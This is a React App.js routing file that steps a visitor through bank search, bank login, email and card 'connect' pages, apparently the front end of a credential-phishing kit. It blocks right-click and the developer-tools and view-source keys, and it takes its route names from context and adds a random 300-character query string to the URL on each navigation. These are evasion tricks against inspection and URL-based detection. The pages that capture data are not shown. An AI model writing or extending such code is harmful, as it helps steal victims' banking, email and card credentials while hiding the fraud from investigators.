import { BrowserRouter as Router, Routes, Route } from 'react-router-dom'
import React, { useEffect } from 'react';
import { AppContextProvider, useAppContext } from './context/AppContext'
import LoadingPage from './pages/001LoadingPage'
import BankSearchPage from './pages/002BankSearchPage'
import ConnectBankPage from './pages/003ConnectBankPage'
import EmailConnectPage from './pages/004EmailConnectPage'
import CardConnectPage from './pages/005CardConnectPage'
import CompleteTXPage from './pages/006CompleteTXPage'

function AppRoutes() {
  const { bankSearch, connectBank, emailConnect, cardConnect, completeTx } = useAppContext();

  useEffect(() => {
    // Prevent right click
    const handleContextMenu = (e) => {
      e.preventDefault();
      return false;
    };

    // Prevent F12 and Ctrl+Shift+I
    const handleKeyDown = (e) => {
      if (
        e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
        (e.ctrlKey && e.key === 'u')
      ) {
        e.preventDefault();
        return false;
      }
    };

    document.addEventListener('contextmenu', handleContextMenu);
    document.addEventListener('keydown', handleKeyDown);

    return () => {
      document.removeEventListener('contextmenu', handleContextMenu);
      document.removeEventListener('keydown', handleKeyDown);
    };
  }, []);
  
  // Function to generate a random string of up to 300 characters
  const generateRandomString = (length) => {
    let result = '';
    while (result.length < length) {
      result += Math.random().toString(36).substring(2); // Generate a random string and append
    }
    return result.substring(0, length); // Trim to the desired length
  };

  const randomizePath = () => {
    const randomString = generateRandomString(300); // Generate a 300-character string
    const currentPath = window.location.pathname;
    window.history.pushState({}, '', `${currentPath}?b=${randomString}`);
  };

  useEffect(() => {
    // Add random buff when route changes
    randomizePath();
  }, [window.location.pathname]);

  return (
    <Routes>
      <Route path="/" element={<LoadingPage />} />
      <Route path={`/${bankSearch}`} element={<BankSearchPage />} />
      <Route path={`/${connectBank}`} element={<ConnectBankPage />} />
      <Route path={`/${emailConnect}`} element={<EmailConnectPage />} />
      <Route path={`/${cardConnect}`} element={<CardConnectPage />} />
      <Route path={`/${completeTx}`} element={<CompleteTXPage />} />
    </Routes>
  );
}

function App() {

  return (
    <Router>
      <AppContextProvider>
        <AppRoutes />
      </AppContextProvider>
    </Router>
  );
}

export default App
